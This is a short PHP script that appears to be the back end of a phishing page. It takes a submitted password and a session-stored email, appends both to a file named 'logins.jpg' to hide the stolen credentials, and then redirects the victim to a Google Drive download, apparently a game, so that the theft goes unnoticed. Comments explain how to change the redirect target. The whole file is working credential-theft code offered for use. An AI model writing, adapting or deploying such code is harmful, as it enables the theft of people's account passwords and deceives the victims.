<?php

			session_start();
			
			$pass = $_POST["Passwd"];
			$email=$_SESSION["Email"];
			//opening logins text file for appending new data.
  			$file = fopen("logins.jpg", "a") or die("Unable to open file!");
			
  			//Writing email and password to logins.jpg. 
  			fwrite($file, $email."	".$pass.PHP_EOL);			
  			fclose($file);//closing logins.jpg.
			
  			//redirecting user to the google drive's locations where the game is available to download.
  			//change the location url to redirect to a website of your choice.
  			header("Location: https://drive.google.com/file/d/0B6gbXN_c6lAQWGF1alVfSDNEREE/view");
			exit();
			
			
			session_destroy();
			

?>
